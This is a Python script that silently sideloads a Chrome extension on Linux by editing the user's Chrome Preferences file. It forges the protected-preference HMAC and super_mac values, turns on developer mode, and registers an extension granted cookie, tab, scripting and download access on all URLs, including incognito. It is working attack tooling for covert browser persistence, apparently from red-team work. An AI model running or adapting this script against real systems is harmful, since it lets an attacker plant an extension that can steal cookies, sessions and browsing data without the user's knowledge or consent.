"""
BSD 4-Clause License

Copyright (c) 2024, asaurusrex
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.
   
3. All advertising materials mentioning features or use of this software must display the following acknowledgement:
   This product includes software developed by AsaurusRex.

4. Neither the name of the copyright holder nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
"""


import hmac 
import json 
from collections import OrderedDict
import hashlib
import subprocess
import re
import datetime
import os
import sys

#https://github.com/Pica4x6/SecurePreferencesFile 
def removeEmpty(d):
    if type(d) == type(OrderedDict()):
        t = OrderedDict(d)
        for x, y in t.items():
            if type(y) == (type(OrderedDict())):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif(type(y) == type({})):
                if(len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]

    elif type(d) == type([]):
        for x, y in enumerate(d):
            if type(y) == type(OrderedDict()):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type({})):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]

#https://github.com/Pica4x6/SecurePreferencesFile
def calculateHMAC(value_as_string, path, sid, seed):
    if ((type(value_as_string) == type({})) or (type(value_as_string) == type(OrderedDict()))):
        removeEmpty(value_as_string)
    message = sid + path + json.dumps(value_as_string, separators=(',', ':'), ensure_ascii=False).replace('<', '\\u003C').replace(
        '\\u2122', '™')
    hash_obj = hmac.new(seed, message.encode("utf-8"), hashlib.sha256)

    return hash_obj.hexdigest().upper()

#https://github.com/Pica4x6/SecurePreferencesFile
def calc_supermac(json_file, sid, seed):
    # Reads the file
    json_data = open(json_file, encoding="utf-8")
    data = json.load(json_data, object_pairs_hook=OrderedDict)
    json_data.close()
    temp = OrderedDict(sorted(data.items()))
    data = temp

    # Calculates and sets the super_mac
    super_msg = sid + json.dumps(data['protection']['macs']).replace(" ", "")
    hash_obj = hmac.new(seed, super_msg.encode("utf-8"), hashlib.sha256)
    return hash_obj.hexdigest().upper()

def encode_to_install_time(date):
    base_date = datetime.datetime(1970, 1, 1, 0, 0, 0)
    difference_in_seconds = (date - base_date).total_seconds()
    install_time = int(difference_in_seconds * 1000000) + 11644473600000000
    return install_time

def calculate_chrome_dev_mac(seed: bytes, sid: str, pref_path: str, pref_value) -> str:
    """
    Calculates the HMAC-SHA256 for a Chrome protected preference.

    Parameters:
        seed (bytes): The secret key from PlatformKeys.
        sid (str): The Windows user SID.
        pref_path (str): The full preference path (e.g., "extensions.ui.developer_mode").
        pref_value: The preference value (e.g., True, False, a string, etc.).

    Returns:
        str: The hexadecimal HMAC digest.
    """
    # Serialize the value to canonical JSON (compact, sorted if needed)
    serialized_value = json.dumps(pref_value, separators=(',', ':'), sort_keys=True)
    
    # Build the input string
    hmac_input = (sid + pref_path + serialized_value).encode('utf-8')
    
    # Calculate the HMAC-SHA256
    return hmac.new(seed, hmac_input, hashlib.sha256).hexdigest()

def get_extension_id(path):
    m=hashlib.sha256()
    #m.update(bytes(path.encode('utf-16-le')))
    m.update(bytes(path.encode('utf-8')))
    EXTID = ''.join([chr(int(i, base=16) + ord('a')) for i in m.hexdigest()][:32])
    print("Using ExtID: {}".format(EXTID))
    return EXTID

def add_extension():
    
    extension_path = "/your/path/here" #change this to point to your extension path
    random_ext_str = get_extension_id(extension_path) 
    #print(random_ext_str)
    sid = "" #empty on Linux
    
    ###add json to file
    given_date = datetime.datetime.now()
    encoded_install_time = encode_to_install_time(given_date)

    #extension_json = r'{"active_permissions":{"api":["contextMenus","history","storage","tabs","unlimitedStorage"],"explicit_host":[],"manifest_permissions":[],"scriptable_host":[]},"commands":{"_execute_action":{"was_assigned":true},"close":{"suggested_key":""},"manager":{"suggested_key":"Alt+A","was_assigned":true},"new":{"suggested_key":"Alt+N","was_assigned":true},"search":{"suggested_key":""},"switch":{"suggested_key":"Alt+S","was_assigned":true}},"content_settings":[],"creation_flags":9,"cws-info":{"is-live":true,"is-present":true,"last-updated-time-millis":"1721372400000","no-privacy-practice":false,"unpublished-long-ago":false,"violation-type":0},"filtered_service_worker_events":{"windows.onCreated":[{}],"windows.onFocusChanged":[{}],"windows.onRemoved":[{}]},"first_install_time":"%s","from_webstore":true,"granted_permissions":{"api":["contextMenus","history","storage","tabs","unlimitedStorage"],"explicit_host":[],"manifest_permissions":[],"scriptable_host":[]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"%s","location":1,"manifest":{"action":{"default_icon":{"32":"images/bookmark_btn.png"},"default_title":"Workona Spaces"},"background":{"service_worker":"background.js"},"commands":{"_execute_action":{"description":"Save current tab to space","suggested_key":{"default":"Alt+D","windows":"Alt+T"}},"close":{"description":"Close space"},"manager":{"description":"Switch space","suggested_key":{"default":"Alt+A"}},"new":{"description":"New space or doc","suggested_key":{"default":"Alt+N"}},"search":{"description":"Open Workona"},"switch":{"description":"Universal search","suggested_key":{"default":"Alt+S"}}},"description":"The world’s best tab manager","externally_connectable":{"matches":["https://workona.com/*","https://*.workona.com/*"]},"homepage_url":"https://workona.com/0/","icons":{"128":"images/icon_128.png","16":"images/icon_16.png","256":"images/icon_256.png","32":"images/icon_32.png","48":"images/icon_96.png","96":"images/icon_96.png"},"key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlTDCGRkVU6zgrNCQQMXwgoVB0A+rGZh9E1yokH4T+cqz6zxMG/f/gZiWHvYDb9thNTtGKyl7LiE0Op3VTqeRlSV8pN5+5ojkSawiNHEXS+8ImzAoSsWTFkiloZnk6HIP2eCKvx2be+mE74Yq/6kPnTxApUitZ6gXVM1udnw59mFhXw8R9DUtMDTfQwA1Us8UnfBIEyqIfcqVqdymYjZfD9e16n7kVzq4p0yHnXgyrIUhRsI2APfsgVD673R7sDtbJDeU5lvuZBvBjczKw16YL2RqdlzmVZXaIZClsWWMEoyH9Q2mLZf9tM5aaSoiguMQ3VVlDRMzlzm5xtjFmLfINwIDAQAB","manifest_version":3,"minimum_chrome_version":"102","name":"Tab Manager by Workona","optional_host_permissions":["https://workona.com/*","https://*.workona.com/*"],"optional_permissions":["system.memory","tabGroups"],"permissions":["contextMenus","history","tabs","storage","unlimitedStorage"],"short_name":"Workona","update_url":"https://clients2.google.com/service/update2/crx","version":"3.1.32"},"needs_sync":true,"path":"ailcmbgekjpnablpdkmaaccecekgdhlh/3.1.32_0","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"3.1.32"},"serviceworkerevents":["commands.onCommand","contextMenus.onClicked","runtime.onConnectExternal","runtime.onInstalled","runtime.onStartup","runtime.onSuspend","runtime.onSuspendCanceled","runtime.onUpdateAvailable","tabs.onActivated","tabs.onAttached","tabs.onCreated","tabs.onDetached","tabs.onMoved","tabs.onRemoved","tabs.onReplaced","tabs.onUpdated"],"state":1,"uninstall_url":"https://workona.com/extension-feedback/","was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}' % (encoded_install_time, encoded_install_time)

    #print(encoded_install_time)
    extension_json=r'{"account_extension_type":0,"active_permissions":{"api":["cookies","storage","tabs","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"first_install_time":"%s","from_webstore":false,"granted_permissions":{"api":["cookies","downloads","storage","tabs"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito":true,"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"%s","location":4,"newAllowFileAccess":true,"path":"%s","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}' % (encoded_install_time, encoded_install_time, extension_path)
    

    dict_extension=json.loads(extension_json, object_pairs_hook=OrderedDict)
    username = os.getlogin()
    filepath = "/home/{}/.config/google-chrome/Default/Preferences".format(username)
   
    with open(filepath, 'rb') as f:
        data = f.read()
        f.close()

    data=json.loads(data,object_pairs_hook=OrderedDict)
    
    data["extensions"]["settings"][random_ext_str] = dict_extension
   
    ###calculate hash for [protect][mac]
    path="extensions.settings.{}.".format(random_ext_str)
    #hardcoded seed
    #seed=b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
    seed = b""
    macs = calculateHMAC(dict_extension, path[:-1], sid, seed)
    #print(macs)
    #add macs to json file
    data["protection"]["macs"]["extensions"]["settings"][random_ext_str]=macs

    #set dev mode to true
    try:
        data["extensions"]["ui"]["developer_mode"]=True
    except KeyError: # means extensions: UI is not found
       
        # developer_mode = OrderedDict()
        # ui = OrderedDict()
        

        data["extensions"].setdefault("ui", OrderedDict())
        # now insert your empty OrderedDict into developer_mode
        data["extensions"]["ui"]["developer_mode"] = OrderedDict()
        data["extensions"]["ui"]["developer_mode"]= True

        # print("Need to toggle developer mode")
        # sys.exit()

    pref_path = "extensions.ui.developer_mode"
    pref_value = True
    mac = calculate_chrome_dev_mac(seed, sid, pref_path, pref_value)
    #print(mac)
    try:
        data["protection"]["macs"]["extensions"]["ui"]["developer_mode"]=mac
    except KeyError:
        print("Need to toggle developer mode")
        sys.exit()
    devmode_value=r'{"developer_mode": true}'
    parseddevmode=json.loads(devmode_value, object_pairs_hook=OrderedDict)
    
    newdata=json.dumps(data)
    
    with open(filepath, 'w') as z:
            z.write(newdata)
    z.close()
    ###recalculate and replace super_mac
    #print("=======================================================================================================================================================================================================================\n")
    supermac=calc_supermac(filepath,sid,seed)
    #print(supermac)
    data["protection"]["super_mac"]=supermac
    newdata=json.dumps(data)
    #print(newdata)
    with open(filepath, 'w') as z:
            z.write(newdata)
    z.close()

if __name__ == "__main__":
    add_extension()
    print("Extension added!")
